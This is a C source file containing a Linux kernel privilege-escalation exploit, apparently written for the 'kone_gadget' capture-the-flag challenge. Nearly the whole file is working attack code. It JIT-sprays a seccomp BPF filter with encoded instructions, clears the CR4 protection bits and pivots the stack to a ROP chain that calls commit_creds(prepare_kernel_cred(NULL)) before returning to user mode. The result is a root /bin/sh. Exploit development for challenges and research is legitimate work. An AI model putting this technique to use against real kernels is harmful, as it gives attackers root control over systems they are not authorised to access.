#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/mman.h>


uint64_t user_cs, user_ss, user_rsp, user_rflags;

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

static void save_state() {
    asm(
        "mov %0, cs\n"
        "mov %1, ss\n"
        "mov %2, rsp\n"
        "pushf\n"
        "pop %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");
}

static void install_seccomp(unsigned char *filter, unsigned short length) {
    struct prog {
        unsigned short len;
        unsigned char *filter;
    } rule = {
        .len = length >> 3,
        .filter = filter
    };
    if(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) < 0) {
        perror("prctl(PR_SET_NO_NEW_PRIVS)");
        exit(-1);
    }
    if(prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &rule) < 0) {
        perror("prctl(PR_SET_SECCOMP)");
        exit(-1);
    }
}


/*
HOW TO USE:
addr_commit_creds is just commit_creds
addr_prepare_kernel_cred is just prepare_kernel_cred
addr_trampoline is swapgs_restore_regs_and_return_to_usermode+0x16 (ret2user)
(Gadget starts with mov rdi, rsp)

To actually trigger the exploit, you need to jump to the jitted bpf.
In the kone_gadget challenge, this was 0xffffffffc0000f00
*/
void kone_gadget(uint64_t addr_commit_creds, 
                 uint64_t addr_prepare_kernel_cred,
                 uint64_t addr_trampoline
                ) {
    save_state();

    int N = 0x312; // make bpf random entropy as small as possible
    unsigned short filter_length = N*8 + 8;
    uint64_t *filter = (uint64_t*)malloc(filter_length);

    /* Map stack (POPULATE it so that it's readable/writable under KPTI) */
    char *stack = (char*)mmap((void*)0xfff000, 0x2000,
                              PROT_READ | PROT_WRITE,
                              MAP_ANONYMOUS | MAP_SHARED | MAP_POPULATE | MAP_FIXED,
                              -1, 0);
    if (stack != (char*)0xfff000) {
        perror("mmap");
        exit(-1);
    }
    // Gadget-free ROP chain!
    uint64_t *rsp = (uint64_t*)&stack[0x1000];
    *rsp++ = addr_prepare_kernel_cred;
    *rsp++ = addr_commit_creds;
    *rsp++ = addr_trampoline; // ret2usermode
    *rsp++ = 0xcafebabe; // garbage (pop rax)
    *rsp++ = 0xdeadbeef; // garbage (pop rdi)
    *rsp++ = (uint64_t)&win;
    *rsp++ = user_cs;
    *rsp++ = user_rflags;
    *rsp++ = user_rsp;
    *rsp++ = user_ss;

    // Fill our filter with nop sled
    for (int i = 0; i < N; i++) {
        filter[i] = (uint64_t)(0x01eb9090) << 32; // nop; nop; jmp 1;
    }
    uint64_t *chain = &filter[N - 20];
    // rdi = cr4
    *chain++ = (uint64_t)(0x04E7200F) << 32; // mov rdi, cr4; add al, XX;
    // edx = ~0x300000
    *chain++ = (uint64_t)(0x01ebD231) << 32; // xor edx, edx; jmp 1;
    *chain++ = (uint64_t)(0x01ebC2FF) << 32; // inc edx; jmp 1;
    *chain++ = (uint64_t)(0x01ebE2D1) << 32; // shl edx, 1; jmp 1;
    *chain++ = (uint64_t)(0x01ebC2FF) << 32; // inc edx; jmp 1;
    *chain++ = (uint64_t)(0x0414E2C1) << 32; // shl edx, 20; add al, XX;
    *chain++ = (uint64_t)(0x01ebD2F7) << 32; // not edx;
    // rdi &= rdx
    *chain++ = (uint64_t)(0x04D72148) << 32; // and rdi, rdx; add al, XX;
    // cr4 = rdi
    *chain++ = (uint64_t)(0x04E7220F) << 32; // mov cr4, rdi; add al, XX;
    // esp = 0x1000000
    *chain++ = (uint64_t)(0x01ebE431) << 32; // xor esp, esp; jmp 1;
    *chain++ = (uint64_t)(0x01ebC4FF) << 32; // inc esp; jmp 1;
    *chain++ = (uint64_t)(0x0418E4C1) << 32; // shl esp, 24; add al, XX;
    // commit_creds(prepare_kernel_cred(NULL));
    *chain++ = (uint64_t)(0x01ebFF31) << 32; // xor edi, edi; jmp 1;
    *chain++ = (uint64_t)(0x01eb9058) << 32; // pop rax; nop; jmp 1;
    *chain++ = (uint64_t)(0x01ebD0FF) << 32; // call rax; jmp 1;
    *chain++ = (uint64_t)(0x04C78948) << 32; // mov rdi, rax; add al, XX;
    *chain++ = (uint64_t)(0x01eb9058) << 32; // pop rax; nop; jmp 1;
    *chain++ = (uint64_t)(0x01ebD0FF) << 32; // call rax; jmp 1;
    // jump to swapgs_restore_regs_and_return_to_usermode
    *chain++ = (uint64_t)(0xccE0FF58) << 32; // pop rax; jmp rax;
    filter[N] = 0x7fff000000000006; // RETURN ALLOW

    /* JIT our filter */
    install_seccomp((unsigned char*)filter, filter_length);

    /* Jump to nop sled of JIT-ted seccomp filter */
    puts("[+] bring your own shellcode: go brrrrr");
}
